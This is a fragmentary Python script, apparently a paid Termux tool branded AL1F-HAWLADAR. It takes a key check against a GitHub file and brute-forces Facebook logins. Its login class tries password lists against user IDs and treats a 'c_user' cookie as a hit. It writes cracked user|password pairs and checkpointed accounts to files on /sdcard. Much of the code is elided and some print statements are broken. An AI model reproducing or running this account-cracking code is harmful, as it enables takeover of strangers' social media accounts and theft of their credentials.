import os
os.system("xdg-open https://www.facebook.com/Cyber.420.Alif")
try:
...
def main_apv():
    ...
    try:
        ...
        os.system('am start https://wa.me/+2349038303472?text=' + tks)

        

    r1=requests.get("https://raw.githubusercontent.com/Qhingthuth/Dammy-Random-Clone01/main/approval.txt").text
    ...
    if key1 in r1:
        ...
        print ("         ༄AL1F•───────────────────────────────────────•༄HAWLADAR᭄")
        print ("             \033[1;94mJOIN MY FB GROUP AND INVITE 500 FRIEND AND GIVE ME PROF")     
...
|/     \|(_______/\_______/|/       
        ...
        \033[1;92m༄AL1F᭄•───────────────────────────────────────•༄HAWLADAR᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m➣    \033[1;95m𝐀𝐔𝐓𝐇𝐎𝐑   : MD ALIF                \033[1;93m
             \033[1;93m➣    \033[1;94m𝐆𝐈𝐓𝐇𝐔𝐁   : ༺CYB3R-AL1F༻                   \033[1;93m
             \033[1;93m➣    \033[1;93m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 :Md Alif             \033[1;93m
             \033[1;93m➣    \033[1;92m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 : 𝟎𝟏𝟕𝟔𝟖𝟓𝟕𝟔𝟗𝟏𝟖༻               \033[1;93m
             \033[1;93m➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m
             \033[1;93m➣    \033[1;94mSEND ME YOUR KEY IN MY WHATSAPP     \033[1;93m
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄AL1F᭄•───────────────────────────────────────•༄HAWLADAR᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/AL1F-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/AL1F-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back ALIF Menu ")
...
def R():
			...
			print("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥  \033[1;91mFOLLEW ME ON WATAAP ")

			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mBEST OF LUCK MY DEAR USER  : AL1F-HAWLADAR")
			print ('\033[1;92m༄AL1F•───────────────────────────────────────•༄HAWLADAR᭄')
			key = input(" [*] Choose : ")
			print ('༄AL1F•───────────────────────────────────────•༄HAWLADAR᭄')
			...
			if key in [""]:
				...
				os.system("xdg-open https://wa.me/+2349038303472")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[AL1F]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AL1F-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/AL1F_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/AL1F_CP.txt' , 'a').write('%s\n' % wrt)
